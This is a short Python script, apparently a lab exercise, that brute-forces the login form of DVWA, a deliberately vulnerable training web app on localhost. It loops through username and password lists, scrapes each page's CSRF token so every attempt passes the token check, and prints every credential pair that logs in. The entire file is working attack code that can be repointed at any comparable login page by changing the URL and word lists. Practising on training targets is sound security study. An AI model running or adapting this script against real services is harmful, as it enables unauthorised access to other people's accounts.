#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

def brute_dvwa_login():
    url = "http://localhost/DVWA/login.php"
    users = ['admin', 'gordonb', '1337', 'pablo', 'smithy','gordonb', 'pablo', 'pako', 'admin', 'pablo', '1337']
    passwords = ['234234', '1234', 'abc123', '1234567890', 'password', '123456', 'admin']
    
    found_credentials = []  # Lista para guardar todas las credenciales válidas

    for user in users:
        for pwd in passwords:
            s = requests.Session()

            # Primero obtener el token
            r = s.get(url)
            soup = BeautifulSoup(r.text, 'html.parser')
            token_input = soup.find('input', {'name': 'user_token'})
            
            if not token_input:
                print("[-] No se pudo encontrar el token CSRF")
                continue
                
            token = token_input['value']

            # Intentar login
            login_data = {
                'username': user,
                'password': pwd,
                'Login': 'Login',
                'user_token': token
            }

            r = s.post(url, data=login_data)

            if 'login.php' not in r.url:  # Si no redirige al login = éxito
                print(f"[+] Login exitoso: {user}:{pwd}")
                found_credentials.append((user, pwd))
                # CONTINÚA probando en lugar de return
            else:
                print(f"[-] Fallo: {user}:{pwd}")

    # Mostrar resumen al final
    print("\n" + "="*50)
    print("RESUMEN DE CREDENCIALES VÁLIDAS:")
    for user, pwd in found_credentials:
        print(f"  {user}:{pwd}")
    print(f"Total encontradas: {len(found_credentials)}")
    print("="*50)

brute_dvwa_login()
